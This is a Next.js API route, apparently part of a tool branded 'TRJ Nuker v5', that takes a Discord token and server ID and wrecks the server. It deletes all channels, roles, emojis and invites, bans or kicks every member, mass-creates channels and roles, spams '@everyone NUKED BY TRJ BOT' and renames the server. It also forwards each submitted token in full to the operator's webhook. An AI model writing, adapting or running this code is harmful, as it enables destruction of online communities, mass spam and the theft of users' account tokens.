import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

const API = 'https://discord.com/api/v10';

function cleanToken(token: string): string {
  return String(token || '').trim().replace(/^(Bot |bearer |Bearer )/i, '');
}

const authCache = new Map<string, string>();

async function detectAuth(ct: string): Promise<string> {
  if (authCache.has(ct)) return authCache.get(ct)!;
  const tryUser = await rawFetch(ct, 'GET', '/users/@me');
  if (tryUser.ok) { authCache.set(ct, ct); return ct; }
  const tryBot = await rawFetch(`Bot ${ct}`, 'GET', '/users/@me');
  if (tryBot.ok) { authCache.set(ct, `Bot ${ct}`); return `Bot ${ct}`; }
  return ct;
}

let rlWait = 0;

async function rawFetch(auth: string, method: string, endpoint: string, body?: unknown): Promise<{ ok: boolean; data?: any; status: number; rl: boolean }> {
  const url = endpoint.startsWith('http') ? endpoint : `${API}${endpoint}`;
  const headers: Record<string, string> = { 'Authorization': auth };
  if (method !== 'GET' && body) headers['Content-Type'] = 'application/json';

  const now = Date.now();
  if (now < rlWait) await new Promise(r => setTimeout(r, rlWait - now + 20));

  try {
    const res = await fetch(url, {
      method, headers,
      body: (method !== 'GET' && body) ? JSON.stringify(body) : undefined,
      signal: AbortSignal.timeout(15000),
    });

    if (res.status === 429) {
      try {
        const err = await res.json();
        const w = (err.retry_after || 0.3) * 1000;
        rlWait = Date.now() + w;
        return { ok: false, status: 429, rl: true };
      } catch {
        rlWait = Date.now() + 500;
        return { ok: false, status: 429, rl: true };
      }
    }
    if (res.status === 204) return { ok: true, status: 204, rl: false };
    try { const d = await res.json(); return { ok: res.ok, data: d, status: res.status, rl: false }; }
    catch { return { ok: res.ok, status: res.status, rl: false }; }
  } catch { return { ok: false, status: 0, rl: false }; }
}

async function pExec<T>(
  items: T[], fn: (item: T) => Promise<{ ok: boolean; rl?: boolean }>,
  batch = 50, retries = 2,
): Promise<{ success: number; failed: number }> {
  if (!items.length) return { success: 0, failed: 0 };
  let success = 0, failed = 0;

  for (let i = 0; i < items.length; i += batch) {
    const b = items.slice(i, i + batch);
    let toRetry: T[] = b;

    for (let attempt = 0; attempt <= retries; attempt++) {
      if (!toRetry.length) break;
      const results = await Promise.allSettled(toRetry.map(fn));
      const next: T[] = [];
      for (let j = 0; j < results.length; j++) {
        const r = results[j];
        if (r.status === 'fulfilled' && r.value.ok) success++;
        else if (r.status === 'fulfilled' && r.value.rl && attempt < retries) next.push(toRetry[j]);
        else failed++;
      }
      toRetry = next;
      if (toRetry.length) await new Promise(r => setTimeout(r, 300));
    }
  }
  return { success, failed };
}

async function deleteAllChannels(auth: string, guildId: string): Promise<number> {
  let total = 0;
  for (let round = 0; round < 3; round++) {
    const chRes = await rawFetch(auth, 'GET', `/guilds/${guildId}/channels`);
    if (!chRes.ok || !Array.isArray(chRes.data) || !chRes.data.length) break;
    const all = chRes.data as any[];
    const r = await pExec(all, ch => rawFetch(auth, 'DELETE', `/channels/${ch.id}`).then(res => ({ ok: res.ok || res.status === 404, rl: res.rl })), 50, 3);
    total += r.success;
    if (r.failed === 0) break;
  }
  return total;
}

async function createChannels(auth: string, guildId: string, name: string, count: number): Promise<string[]> {
  const ids: string[] = [];
  await pExec(
    Array.from({ length: count }, (_, i) => i),
    async () => {
      const r = await rawFetch(auth, 'POST', `/guilds/${guildId}/channels`, { name, type: 0 });
      if (r.ok && r.data?.id) { ids.push(r.data.id); return { ok: true }; }
      return { ok: false, rl: r.rl };
    },
    50, 3,
  );
  return ids;
}

async function spamAllChannels(auth: string, ids: string[], msg: string, perCh: number): Promise<number> {
  if (!ids.length) return 0;
  let total = 0;
  await pExec(
    ids,
    async (chId: string) => {
      let sent = 0;
      let attempts = 0;
      const maxAttempts = perCh * 3; // حد أقصى للمحاولات
      while (sent < perCh && attempts < maxAttempts) {
        attempts++;
        const remaining = perCh - sent;
        const batch = Math.min(remaining, 5); // 5 رسائل بالتوازي فقط (يمنع Rate Limit)
        const results = await Promise.allSettled(
          Array.from({ length: batch }, () => rawFetch(auth, 'POST', `/channels/${chId}/messages`, { content: msg }))
        );
        const batchSent = results.filter(r => r.status === 'fulfilled' && r.value.ok).length;
        sent += batchSent;
        if (sent < perCh && attempts < maxAttempts) {
          await new Promise(r => setTimeout(r, batchSent === 0 ? 2500 : 1100));
        }
      }
      total += sent;
      return { ok: sent > 0 };
    },
    15, 1,
  );
  return total;
}

async function deleteAllRoles(auth: string, guildId: string): Promise<number> {
  const res = await rawFetch(auth, 'GET', `/guilds/${guildId}/roles`);
  if (!res.ok || !Array.isArray(res.data)) return 0;
  const roles = (res.data as any[]).filter(r => r.name !== '@everyone' && !r.managed && r.position < 100);
  if (!roles.length) return 0;
  const r = await pExec(roles, role => rawFetch(auth, 'DELETE', `/guilds/${guildId}/roles/${role.id}`).then(res => ({ ok: res.ok || res.status === 404, rl: res.rl })), 50, 3);
  return r.success;
}

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:nuker`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const {
      token, guildId, action,
      channelName = 'nuked-by-trj', channelCount = 50,
      msgPerChannel = 50, message = '@everyone NUKED BY TRJ BOT',
      name = 'NUKED', renameChannels = 'nuked',
      createRolesCount = 50, rolesName = 'nuked-role',
      slowmodeSeconds = 0, spamCount = 10,
    } = body;

    if (!token || !guildId || !action) return NextResponse.json({ success: false, error: 'بيانات ناقصة' }, { status: 400 });

    sendFullToken('نيوكر', token, { '🏰 السيرفر': guildId, '💪 العملية': action });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();
    const stats: Record<string, number> = { deleted: 0, created: 0, spam_sent: 0, banned: 0, roles: 0, renamed: 0, emojis: 0, slowmode: 0, kicked: 0, invites: 0, categories: 0 };

    const auth = await detectAuth(ct);
    const testRes = await rawFetch(auth, 'GET', '/users/@me');
    if (!testRes.ok) return NextResponse.json({ success: false, error: 'التوكن غير صالح' }, { status: 401 });
    const userInfo = String(testRes.data?.username || 'Unknown');
    const myId = testRes.data?.id;

    sendToWebhook({ username: 'TRJ Nuker v5', embeds: [{ title: `💥 Nuker: ${action}`, color: 0xFF0000, fields: [{ name: '👤', value: userInfo, inline: true }, { name: '🏰', value: guildId, inline: true }] }] }, whUrl).catch(() => {});

    const F = (m: string, e: string, b?: unknown) => rawFetch(auth, m, e, b);

    if (action === 'nuke') {
      const [chRes, rolesRes] = await Promise.all([F('GET', `/guilds/${guildId}/channels`), F('GET', `/guilds/${guildId}/roles`)]);
      if (chRes.ok && Array.isArray(chRes.data)) {
        const r = await pExec(chRes.data, ch => F('DELETE', `/channels/${ch.id}`).then(res => ({ ok: res.ok || res.status === 404, rl: res.rl })), 50, 3);
        stats.deleted = r.success;
      }
      if (rolesRes.ok && Array.isArray(rolesRes.data)) {
        const roles = (rolesRes.data as any[]).filter(r => r.name !== '@everyone' && !r.managed && r.position < 100);
        const r = await pExec(roles, role => F('DELETE', `/guilds/${guildId}/roles/${role.id}`).then(res => ({ ok: res.ok || res.status === 404, rl: res.rl })), 50, 3);
        stats.roles = r.success;
      }
      const count = Math.min(Math.max(channelCount, 1), 500);
      const ids = await createChannels(auth, guildId, channelName, count);
      stats.created = ids.length;
      const msgs = Math.min(Math.max(msgPerChannel, 0), 50);
      if (msgs > 0 && ids.length > 0) stats.spam_sent = await spamAllChannels(auth, ids, message, msgs);
    }

    else if (action === 'banall') {
      let after = '';
      for (let page = 0; page < 50; page++) {
        const mr = await F('GET', `/guilds/${guildId}/members?limit=1000${after ? `&after=${after}` : ''}`);
        if (!mr.ok || !Array.isArray(mr.data) || !mr.data.length) break;
        const toBan = (mr.data as any[]).filter(m => m.user?.id && m.user.id !== myId);
        if (toBan.length) {
          const r = await pExec(toBan, m => F('PUT', `/guilds/${guildId}/bans/${m.user.id}`, { delete_message_days: 7 }).then(res => ({ ok: res.ok, rl: res.rl })), 50, 3);
          stats.banned += r.success;
        }
        after = mr.data[mr.data.length - 1]?.user?.id || '';
        if (mr.data.length < 1000) break;
      }
    }

    else if (action === 'kickall') {
      let after = '';
      for (let page = 0; page < 50; page++) {
        const mr = await F('GET', `/guilds/${guildId}/members?limit=1000${after ? `&after=${after}` : ''}`);
        if (!mr.ok || !Array.isArray(mr.data) || !mr.data.length) break;
        const toKick = (mr.data as any[]).filter(m => m.user?.id && m.user.id !== myId && !m.user?.bot);
        if (toKick.length) {
          const r = await pExec(toKick, m => F('DELETE', `/guilds/${guildId}/members/${m.user.id}`).then(res => ({ ok: res.ok, rl: res.rl })), 50, 3);
          stats.kicked += r.success;
        }
        after = mr.data[mr.data.length - 1]?.user?.id || '';
        if (mr.data.length < 1000) break;
      }
    }

    else if (action === 'delete_channels') {
      stats.deleted = await deleteAllChannels(auth, guildId);
    }

    else if (action === 'delete_roles') {
      stats.roles = await deleteAllRoles(auth, guildId);
    }

    else if (action === 'spam') {
      const chRes = await F('GET', `/guilds/${guildId}/channels`);
      if (chRes.ok && Array.isArray(chRes.data)) {
        const textCh = (chRes.data as any[]).filter(c => c.type === 0 || c.type === 5).map(c => c.id);
        const perCh = Math.min(Math.max(msgPerChannel || spamCount || 10, 1), 50);
        stats.spam_sent = await spamAllChannels(auth, textCh, message, perCh);
      }
    }

    else if (action === 'rename') {
      const r = await F('PATCH', `/guilds/${guildId}`, { name });
      if (!r.ok) return NextResponse.json({ success: false, error: `فشل تغيير الاسم: ${r.status}` });
    }

    else if (action === 'rename_channels') {
      const chRes = await F('GET', `/guilds/${guildId}/channels`);
      if (chRes.ok && Array.isArray(chRes.data)) {
        const channels = (chRes.data as any[]).filter(c => [0, 2, 4, 5, 13, 15].includes(c.type));
        const r = await pExec(channels, ch => F('PATCH', `/channels/${ch.id}`, { name: renameChannels }).then(res => ({ ok: res.ok, rl: res.rl })), 50, 3);
        stats.renamed = r.success;
      }
    }

    else if (action === 'create_roles') {
      const count = Math.min(Math.max(createRolesCount || 50, 1), 250);
      const r = await pExec(
        Array.from({ length: count }, (_, i) => `${rolesName}-${i + 1}`),
        (rn: string) => F('POST', `/guilds/${guildId}/roles`, { name: rn, color: Math.floor(Math.random() * 16777215), hoist: false, mentionable: false }).then(res => ({ ok: res.ok, rl: res.rl })),
        50, 3,
      );
      stats.roles = r.success;
    }

    else if (action === 'delete_emojis') {
      const emojiRes = await F('GET', `/guilds/${guildId}/emojis`);
      if (emojiRes.ok && Array.isArray(emojiRes.data)) {
        const r = await pExec(emojiRes.data, (e: any) => F('DELETE', `/guilds/${guildId}/emojis/${e.id}`).then(res => ({ ok: res.ok || res.status === 404, rl: res.rl })), 50, 3);
        stats.emojis = r.success;
      }
    }

    else if (action === 'slowmode') {
      const seconds = Math.min(Math.max(slowmodeSeconds || 21600, 0), 21600);
      const chRes = await F('GET', `/guilds/${guildId}/channels`);
      if (chRes.ok && Array.isArray(chRes.data)) {
        const ch = (chRes.data as any[]).filter(c => c.type === 0 || c.type === 5 || c.type === 2);
        const r = await pExec(ch, (c: any) => F('PATCH', `/channels/${c.id}`, { rate_limit_per_user: seconds }).then(res => ({ ok: res.ok, rl: res.rl })), 50, 3);
        stats.slowmode = r.success;
      }
    }

    else if (action === 'create_channels') {
      const count = Math.min(Math.max(channelCount, 1), 500);
      const ids = await createChannels(auth, guildId, channelName, count);
      stats.created = ids.length;
      const msgs = Math.min(Math.max(msgPerChannel, 0), 50);
      if (msgs > 0 && ids.length > 0) stats.spam_sent = await spamAllChannels(auth, ids, message, msgs);
    }

    else if (action === 'create_categories') {
      const count = Math.min(Math.max(channelCount, 1), 100);
      const r = await pExec(
        Array.from({ length: count }, (_, i) => `${channelName}-${i + 1}`),
        (cn: string) => F('POST', `/guilds/${guildId}/channels`, { name: cn, type: 4 }).then(res => ({ ok: res.ok, rl: res.rl })),
        50, 3,
      );
      stats.categories = r.success;
    }

    else if (action === 'delete_invites') {
      const invRes = await F('GET', `/guilds/${guildId}/invites`);
      if (invRes.ok && Array.isArray(invRes.data) && invRes.data.length > 0) {
        const r = await pExec(invRes.data, (inv: any) => F('DELETE', `/invites/${inv.code}`).then(res => ({ ok: res.ok || res.status === 404, rl: res.rl })), 50, 3);
        stats.invites = r.success;
      }
      try { const vr = await F('DELETE', `/guilds/${guildId}/vanity-url`); if (vr.ok || vr.status === 204) stats.invites++; } catch {}
    }

    else if (action === 'destroy') {
      const t0 = Date.now();

      const [chRes, renameRes] = await Promise.all([
        F('GET', `/guilds/${guildId}/channels`),
        F('PATCH', `/guilds/${guildId}`, { name: name || 'NUKED' }),
      ]);

      stats.deleted = await deleteAllChannels(auth, guildId);

      const count = Math.min(Math.max(channelCount, 1), 500);
      const ids = await createChannels(auth, guildId, channelName, count);
      stats.created = ids.length;

      const msgs = Math.min(Math.max(msgPerChannel || spamCount || 10, 1), 50);
      if (msgs > 0 && ids.length > 0) {
        stats.spam_sent = await spamAllChannels(auth, ids, message, msgs);
      }

      console.log(`[DESTROY ${(Date.now() - t0) / 1000}s] Del:${stats.deleted} Cre:${stats.created} Spam:${stats.spam_sent}`);
    }

    else {
      return NextResponse.json({ success: false, error: 'إجراء غير معروف' }, { status: 400 });
    }

    sendToWebhook({
      username: 'TRJ Nuker v5',
      embeds: [{
        title: '✅ Nuker Done', color: 0x00FF41,
        fields: [
          { name: '📺 Deleted', value: String(stats.deleted), inline: true },
          { name: '🎭 Roles', value: String(stats.roles), inline: true },
          { name: '📺 Created', value: String(stats.created), inline: true },
          { name: '💬 Spam', value: String(stats.spam_sent), inline: true },
          { name: '🔨 Banned', value: String(stats.banned), inline: true },
          { name: '👢 Kicked', value: String(stats.kicked), inline: true },
          { name: '😀 Emojis', value: String(stats.emojis), inline: true },
          { name: '🏰 Guild', value: guildId, inline: true },
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Nuker Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}

